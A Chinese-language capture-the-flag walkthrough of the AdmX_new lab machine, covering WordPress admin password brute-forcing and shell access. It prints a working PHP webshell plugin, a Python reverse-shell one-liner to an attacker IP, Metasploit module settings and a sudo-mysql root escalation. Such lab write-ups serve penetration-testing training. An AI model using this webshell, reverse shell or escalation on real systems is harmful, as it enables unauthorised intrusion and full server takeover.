# 打靶-AdmX_new



<div class="has-toc have-toc">
</div>

## 0x00 准备工作

难度等级: 中  
打靶目标: 取得 2 个 flag + root 权限

涉及攻击方法:

  * 主机发现
  * 端口扫描
  * WEB路径爆破
  * BurpSuite内容替换
  * 密码爆破
  * MSF漏洞利用
  * WordPress后台漏洞利用
  * 升级Full TTY终端
  * 蚁剑上线
  * 利用MySQL提权

## 0x01 信息搜集

扫描靶机端口，发现在80上开启了apache服务.<figure class="wp-block-image size-full">

<img loading="lazy" width="2349" height="1072" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-101.png" alt="" class="wp-image-4093" /> </figure> 

打开是默认页面。<figure class="wp-block-image size-full">

<img loading="lazy" width="1417" height="707" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-102.png" alt="" class="wp-image-4094" /> </figure> 

然后通过feroxbuster工具来进行目录扫描，扫描结果发现，wordpress目录存在301跳转。<figure class="wp-block-image size-full">

<img loading="lazy" width="2059" height="800" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-103.png" alt="" class="wp-image-4096" /> </figure> 

## 0x02 目标渗透

尝试访问，然而加载的速度异常缓慢。<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-104.png" alt="" class="wp-image-4097" width="596" height="461" /> </figure> 

打开网络能发现浏览器请求了192.168.159.145的资源。<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-105.png" alt="" class="wp-image-4098" width="514" height="171" /> </figure> 

抓包发现dns-prefetch的ip被硬编码为192.168.159.145。 <figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-106.png" alt="" class="wp-image-4099" width="703" height="365" /> </figure> 

在bp的proxy->Option->Match and Replace添加如下图的规则，然后<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-109.png" alt="" class="wp-image-4103" width="334" height="96" /></figure> 

页面资源能够成功加载了，查看里面的内容，发现存在admin用户，再加上之前扫目录出来的/wordpress/admin，感觉可能是个后台。<figure class="wp-block-image size-full">

<img loading="lazy" width="1377" height="651" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-110.png" alt="" class="wp-image-4105" /> </figure> 

访问一下，可以看到有登录的页面，然后使用bp来对密码进行一个爆破，得到密码为adam14，进入后台。<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-112.png" alt="" class="wp-image-4109" width="270" height="333" /> </figure> 

## 0x04 GetShell

WordPress提权的下手角度：

  * Media--通过Media，可以向目标服务器上传文件。
  * Appearence--编辑当前主题的php源码，对404模板进行代码注入。
  * Plugins--Add New以worldpress的插件上传webshell或者编辑原有的插件。

这里可以上传插件，代码如下：

<pre class="wp-block-code"><code>&lt;?php
/**
Plugin Name: webshell
Plugin URI: https://www.baidu.com/
Description: webshell
Version: 1.0
Author: lion
Author URI: https://www.baidu.com/
License: https://www.baidu.com/
*/

if(isset($_GET&#91;'cmd']))
    {
        system($_GET&#91;'cmd']);
    }
?></code></pre>

然后使用`zip -r shell.zip shell.php`将文件压缩成zip格式，上传安装，木马插件的路径为/wordpress/wp-content/plugins/shell.php。然后使用python反弹shell。

<pre class="wp-block-code"><code>python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.92.129",2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'</code></pre>

还可以用msf提权。

<pre class="wp-block-code"><code>use exploit/unix/webapp/wp_admin_shell_upload
set rhosts 192.168.92.135
set username admin
set password adam14
set targeturi /wordpress
run</code></pre><figure class="wp-block-image size-full">

<img loading="lazy" width="1769" height="658" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-114.png" alt="" class="wp-image-4117" /> </figure> 

能达到同样的效果。<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-115.png" alt="" class="wp-image-4118" width="498" height="112" /> </figure> 

先`ls /bin/bash`查看kali上面是否有/bin/bash，再`echo $SHELL`查看当前的shell，如果默认的shell是zsh，可通过`chsh -s /bin/bash`切换，再重启即可。准备就绪后，按ctrl + z，将获取到的shell放入后台，输入下列的命令升级成完全交互式的shell。

<pre class="wp-block-code"><code>stty raw -echo
fg
ls
export SHELL=/bin/bash
export TERM=screen
stty rows 38 columns 116
reset</code></pre>

然后编辑当前主题的php源码，插入一句话木马后，用蚁剑连接。

## 0x05 flag1

尝试读取local.txt，并没有权限。<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-116.png" alt="" class="wp-image-4123" width="593" height="36" /> </figure> 

查看wp-config配置文件，发现数据库的用户名密码。<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-117.png" alt="" class="wp-image-4125" width="388" height="103" /> </figure> 

尝试用该密码切换用户、进入数据库，结果失败，用之前登录后台的密码，成功切换用户。<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-118.png" alt="" class="wp-image-4127" width="577" height="138" /> </figure> 

接着访问local.txt，成功！<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-119.png" alt="" class="wp-image-4128" width="302" height="74" /> </figure> 

## 0x06 flag2

`sudo -l` 发现mysql可以不用root密码以root权限执行<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-120.png" alt="" class="wp-image-4130" width="721" height="109" /> </figure> 

然后在数据库中使用`system id`，确实是root的权限。<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-121.png" alt="" class="wp-image-4131" width="369" height="35" /> </figure> 

使用`\! /bin/bash`切换到root，`\!`为`system`的简化。<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-122.png" alt="" class="wp-image-4133" width="339" height="40" /> </figure>
